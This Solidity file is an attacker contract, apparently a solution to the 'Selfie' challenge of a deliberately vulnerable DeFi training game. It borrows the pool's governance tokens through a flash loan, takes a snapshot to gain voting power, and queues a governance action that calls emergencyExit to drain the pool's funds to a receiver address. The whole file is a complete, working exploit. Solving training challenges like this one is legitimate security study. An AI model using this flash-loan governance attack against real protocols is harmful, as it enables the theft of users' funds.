// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

import {DamnValuableTokenSnapshot} from "@main/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "@main/selfie/SimpleGovernance.sol";
import {SelfiePool} from "@main/selfie/SelfiePool.sol";

contract SelfiePoolAttacker is IERC3156FlashBorrower {

    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;

    address receiver;
    uint256 private actionId;

    constructor(
        address _token,
        address _governance,
        address _pool,
        address _receiver
    ) {
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        receiver = _receiver;
       
    }

    function attack1() external {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            pool.maxFlashLoan(address(token)),
            bytes("")
        );

    }

    function attack2() external {
        governance.executeAction(actionId);
    }

    /**
     * @dev Receive a flash loan.
     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
     */
    function onFlashLoan(
        address ,
        address ,
        uint256 ,
        uint256 ,
        bytes calldata 
    ) external returns (bytes32) {
        token.snapshot();
        // malicious calldata which will transfer all funds
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)", // will transfer balance 
            receiver 
        );
        actionId = governance.queueAction(address(pool), 0, data);
        token.approve(address(pool), token.balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

}